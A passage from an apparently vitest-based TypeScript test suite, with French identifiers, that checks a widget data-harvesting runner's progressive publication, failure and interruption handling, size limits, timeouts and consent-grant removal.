  const beforeChain = (list: unknown[]) => [blockStart("liste"), blockEnd("liste", list), blockStart("fiche")];
  /** Waits until `f` is true (relays are written in the background). */
  async function wait(f: () => Promise<boolean>): Promise<void> {
    for (let i = 0; i < 200; i++) {
      if (await f()) return;
      await new Promise((r) => setTimeout(r, 10));
    }
    throw new Error("attente trop longue");
  }
  const progressIsWorth = (ctx: Context, done: number) => async () =>
    (await readWidgetState(ctx.dossierWidgets, ctx.widget.id)).progression?.faits === done;
  const LAST_UPDATE = "2026-10-27T08:00:00.000Z";
  async function stateBefore(ctx: Context) {
    await writeWidgetState(ctx.dossierWidgets, ctx.widget.id, { statut: "ok", derniereMaj: LAST_UPDATE, derniereTentative: LAST_UPDATE });
  }

  it("two publications write data and in-progress state with progress; the end writes the final result and removes the progress", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { auFilDeLEau: true });
    await stateBefore(ctx);
    const { horloge: h, avancer: advance } = movableClock();
    const seen: unknown[] = [];
    const probe = (done: number) => async () => {
      await wait(progressIsWorth(ctx, done));
      seen.push({ etat: await readWidgetState(ctx.dossierWidgets, "veille"), donnees: await readJson(dataFile(ctx)) });
    };
    let changes = 0;
    const r = await runHarvest({
      ...optionsOf(ctx),
      horloge: h,
      surChange: () => void changes++,
      lancer: launcherSteps(ctx, [
        ...beforeChain([A1, A2]),
        mem(["1"]),
        pub([A1], 1, 2),
        probe(1),
        advance(5000),
        mem(["1", "2"]),
        pub([A1, A2], 2, 2),
        probe(2),
        blockEnd("fiche", [A1, A2]),
        blockStart("sortie"),
        blockEnd("sortie", [A1, A2]),
        { t: "fin", donnees: { final: [A1, A2] } },
      ]),
    });
    expect(seen).toEqual([
      {
        etat: { statut: "en-cours", derniereMaj: LAST_UPDATE, derniereTentative: NOW.toISOString(), progression: { faits: 1, total: 2 }, avant: { statut: "ok" } },
        donnees: [A1],
      },
      {
        etat: { statut: "en-cours", derniereMaj: LAST_UPDATE, derniereTentative: NOW.toISOString(), progression: { faits: 2, total: 2 }, avant: { statut: "ok" } },
        donnees: [A1, A2],
      },
    ]);
    // Start, two publications, end.
    expect(changes).toBe(4);
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toEqual({ final: [A1, A2] });
    expect(await readJson(dataFile(ctx))).toEqual({ final: [A1, A2] });
    const state = await readWidgetState(ctx.dossierWidgets, "veille");
    expect(state.statut).toBe("ok");
    expect(state.progression).toBeUndefined();
    // The earlier state, kept during the run, does not survive its end.
    expect("avant" in state).toBe(false);
    expect((await readMemory(dataOf(ctx))).liste?.valeur).toEqual(["1", "2"]);
  });

  it("failure after two publications: the last one stays, error state, the run's memory kept", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { auFilDeLEau: true, dureeMaxMinutes: 30 });
    await stateBefore(ctx);
    await writeData(ctx.dossierWidgets, "veille", { ancien: true });
    await writeMemory(dataOf(ctx), { liste: { type: "code", valeur: ["ancienne"] } });
    const { horloge: h, avancer: advance } = movableClock();
    const received: string[] = [];
    const r = await runHarvest({
      ...optionsOf(ctx),
      horloge: h,
      lancer: launcherSteps(
        ctx,
        [...beforeChain([A1, A2, A3]), mem(["1"]), pub([A1], 1, 3), advance(5000), mem(["1", "2"]), pub([A1, A2], 2, 3), { t: "journal", bloc: "fiche", texte: "x" }, { t: "echec", erreur: "cassé" }],
        { recu: received },
      ),
    });
    // The maximum duration is passed: limit sent, progressive run, container stopped at 30 min + 30 s.
    expect(JSON.parse(received.join("").split("\n")[0]!)).toMatchObject({ limiteMs: 1_800_000, progressif: true });
    expect(ctx.commandes[0]!.slice(ctx.commandes[0]!.indexOf("timeout"), ctx.commandes[0]!.indexOf("timeout") + 4)).toEqual(["timeout", "-k", "5", "1830"]);
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "cassé", derniereMaj: LAST_UPDATE });
    expect(r.etat.progression).toBeUndefined();
    expect(await readJson(dataFile(ctx))).toEqual([A1, A2]);
    const state = await readWidgetState(ctx.dossierWidgets, "veille");
    expect(state).toMatchObject({ statut: "erreur", derniereMaj: LAST_UPDATE });
    expect(state.progression).toBeUndefined();
    // The last safe memory (not only the one relayed along the way, the first).
    expect((await readMemory(dataOf(ctx))).liste?.valeur).toEqual(["1", "2"]);
    expect((await readRun(dataOf(ctx), r.execution!))?.statut).toBe("echouee");
  });

  it("F3: a publication never overwrites a state that is no longer in-progress (accord-requis written in the meantime)", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { auFilDeLEau: true });
    await stateBefore(ctx);
    const { horloge: h } = movableClock();
    let seen: unknown;
    await runHarvest({
      ...optionsOf(ctx),
      horloge: h,
      lancer: launcherSteps(ctx, [
        ...beforeChain([A1, A2]),
        // What refuserAccord writes during the run.
        () => writeWidgetState(ctx.dossierWidgets, "veille", { statut: "accord-requis", derniereMaj: LAST_UPDATE, derniereTentative: LAST_UPDATE }),
        mem(["1"]),
        pub([A1], 1, 2),
        async () => {
          await wait(async () => existsSync(dataFile(ctx)));
          await new Promise((ok) => setTimeout(ok, 50));
          seen = (await readWidgetState(ctx.dossierWidgets, "veille")).statut;
        },
        { t: "echec", erreur: "cassé" },
      ]),
    });
    expect(seen).toBe("accord-requis");
  });

  it("final data over 2 MB: memoire.json stays the last memory relayed before the exit", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { auFilDeLEau: true, dureeMaxMinutes: 30 });
    await stateBefore(ctx);
    const { horloge: h, avancer: advance } = movableClock();
    const r = await runHarvest({
      ...optionsOf(ctx),
      horloge: h,
      lancer: launcherSteps(ctx, [
        ...beforeChain([A1, A2, A3]),
        mem(["1"]),
        pub([A1], 1, 3),
        advance(40_000),
        blockEnd("fiche", [A1, A2, A3]),
        blockStart("sortie"),
        blockEnd("sortie", [A1, A2, A3]),
        // Retains the keys of 2 and 3, which only the final output shows: it is refused.
        mem(["1", "2", "3"]),
        { t: "fin", donnees: "x".repeat(2 * 1024 * 1024 + 10) },
      ]),
    });
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Données trop grosses (2 Mo au plus)" });
    expect(await readJson(dataFile(ctx))).toEqual([A1]);
    expect((await readMemory(dataOf(ctx))).liste?.valeur).toEqual(["1"]);
  });

  it("interrupted after a publication: published data and memory kept, run interrupted", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { auFilDeLEau: true });
    const { horloge: h, avancer: advance } = movableClock();
    const r = await runHarvest({
      ...optionsOf(ctx),
      horloge: h,
      delaiMs: 500,
      interrompue: () => true,
      lancer: launcherSteps(ctx, [...beforeChain([A1, A2]), mem(["0"]), pub([], 0, 2), advance(5000), mem(["1"]), pub([A1], 1, 2), { t: "journal", bloc: "fiche", texte: "x" }], { bloque: true }),
    });
    expect(r.etat.statut).toBe("erreur");
    expect(await readJson(dataFile(ctx))).toEqual([A1]);
    expect((await readMemory(dataOf(ctx))).liste?.valeur).toEqual(["1"]);
    expect((await readRun(dataOf(ctx), r.execution!))?.statut).toBe("interrompue");
  });

  it("widget without the new fields failing: memory not written (as before)", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx);
    await writeMemory(dataOf(ctx), { liste: { type: "code", valeur: ["ancienne"] } });
    const before = await readFile(memoryFile(ctx), "utf8");
    const r = await runHarvest({
      ...optionsOf(ctx),
      lancer: launcherSteps(ctx, [blockStart("liste"), mem(["1"]), blockEnd("liste", [A1]), blockStart("fiche"), { t: "echec", erreur: "cassé" }]),
    });
    expect(r.etat.statut).toBe("erreur");
    expect(await readFile(memoryFile(ctx), "utf8")).toBe(before);
  });

  it("widget with an account and auFilDeLEau: grant removed between two publications → data erased, accord-requis, nothing written anymore", async () => {
    const ctx = await prepare("veille", "", { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] });
    await inWatch(ctx, { auFilDeLEau: true });
    await giveGrant(ctx.dossierWidgets, "veille", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const { horloge: h, avancer: advance } = movableClock();
    const seen: unknown[] = [];
    const r = await runHarvest({
      ...optionsOf(ctx),
      horloge: h,
      lancer: launcherSteps(ctx, [
        ...beforeChain([A1, A2, A3]),
        mem(["1"]),
        pub([A1], 1, 3),
        async () => {
          await wait(progressIsWorth(ctx, 1));
          // What refuserAccord does, without the erasing: only the removal is seen by the run.
          await removeGrant(ctx.dossierWidgets, "veille");
        },
        advance(5000),
        mem(["1", "2"]),
        pub([A1, A2], 2, 3),
        advance(5000),
        mem(["1", "2", "3"]),
        pub([A1, A2, A3], 3, 3),
        async () => {
          await new Promise((t) => setTimeout(t, 150));
          seen.push({
            donnees: existsSync(dataFile(ctx)),
            memoire: existsSync(memoryFile(ctx)),
            progression: (await readWidgetState(ctx.dossierWidgets, "veille")).progression,
          });
        },
        blockEnd("fiche", [A1, A2, A3]),
        blockStart("sortie"),
        blockEnd("sortie", [A1, A2, A3]),
        { t: "fin", donnees: [A1, A2, A3] },
      ]),
    });
    // After the removal, neither data nor memory, and the state no longer shows any publication.
    expect(seen).toEqual([{ donnees: false, memoire: false, progression: { faits: 1, total: 3 } }]);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreurNoyau: true });
    expect(r.donnees).toBeUndefined();
    expect(existsSync(dataFile(ctx))).toBe(false);
    expect(existsSync(memoryFile(ctx))).toBe(false);
    expect(await listRuns(dataOf(ctx))).toEqual([]);
    expect((await readWidgetState(ctx.dossierWidgets, "veille")).statut).toBe("accord-requis");
  });

  it("a trial of an auFilDeLEau widget writes neither data nor state (nor memory), even with dureeMaxMinutes; limiteMs sent, never progressive", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { auFilDeLEau: true, dureeMaxMinutes: 30 });
    const { horloge: h, avancer: advance } = movableClock();
    const real = await runHarvest({
      ...optionsOf(ctx),
      horloge: h,
      lancer: launcherSteps(ctx, [...beforeChain([A1]), mem(["1"]), pub([A1], 1, 1), blockEnd("fiche", [A1]), blockStart("sortie"), blockEnd("sortie", [A1]), { t: "fin", donnees: [A1] }]),
    });
    expect(real.etat.statut).toBe("ok");
    const snapshot = async () => {
      const r: Record<string, { texte: string; mtime: number } | null> = {};
      for (const name of ["donnees.json", "memoire.json", "etat.json"]) {
        const path = join(dataOf(ctx), name);
        r[name] = existsSync(path) ? { texte: await readFile(path, "utf8"), mtime: (await stat(path)).mtimeMs } : null;
      }
      return r;
    };
    const before = await snapshot();
    expect(Object.values(before).every((f) => f !== null)).toBe(true);
    const received: string[] = [];
    advance(60_000)();
    const r = await runAttempt({
      ...optionsOf(ctx),
      horloge: h,
      origine: real.execution!,
      depart: "fiche",
      lancer: launcherSteps(
        ctx,
        [blockStart("fiche"), mem(["2"]), pub([A2], 1, 1), advance(5000), mem(["3"]), pub([A3], 1, 1), blockEnd("fiche", [A2]), blockStart("sortie"), blockEnd("sortie", [A2]), { t: "fin", donnees: [A2] }],
        { recu: received },
      ),
    });
    expect(r).toMatchObject({ ok: true, statut: "reussie" });
    const start = JSON.parse(received.join("").split("\n")[0]!);
    expect(start.limiteMs).toBe(1_800_000);
    expect(start.progressif).toBeUndefined();
    expect(await snapshot()).toEqual(before);
  });

  it("web: the search starts from urlRecherche, through the given throttle", async () => {
    const BASE = "https://ddg.test/html/";
    const html = `<div class="result"><a class="result__a" href="https://a.example/1">Titre</a><a class="result__snippet">Extrait</a></div>`;
    const ctx = await prepare("veille", `export default async (w) => w.chercherWeb("clio", { nombre: 1 });`);
    ctx.widget.declaration.sources.web = true;
    const pacing = new Pacing({ attendre: async () => {} });
    const search = vi.spyOn(pacing, "rechercher");
    const bridge = new FakeBridge([], { actif: null, autoriser: false, lecture: { pages: [], html: { [searchUrl("clio", BASE)]: html } } });
    const r = await runHarvest({ ...optionsOf(ctx), pont: bridge, menagement: pacing, urlRecherche: BASE });
    expect(r.donnees).toEqual([{ titre: "Titre", url: "https://a.example/1", extrait: "Extrait" }]);
    expect(search).toHaveBeenCalledTimes(1);
  });

  it("new ones: 3 listings of which 1 already in the previous data → 2; widget without notifier → absent", async () => {
    const code = `export default async () => [{ url: "https://a.example/1", prix: 12 }, { url: "https://a.example/2" }, { url: "https://a.example/3" }];`;
    const ctx = await prepare("annonces", code);
    ctx.widget.declaration.recolte = { minutes: 60, notifier: true };
    await writeData(ctx.dossierWidgets, "annonces", [{ url: "https://a.example/1", prix: 10 }]);
    const r = await runHarvest(optionsOf(ctx));
    expect(r.etat.statut).toBe("ok");
    expect(r.nouveaux).toBe(2);

    const without = await prepare("annonces", code);
    await writeData(without.dossierWidgets, "annonces", [{ url: "https://a.example/1", prix: 10 }]);
    const r2 = await runHarvest(optionsOf(without));
    expect(r2.etat.statut).toBe("ok");
    expect(r2).not.toHaveProperty("nouveaux");
  });
});
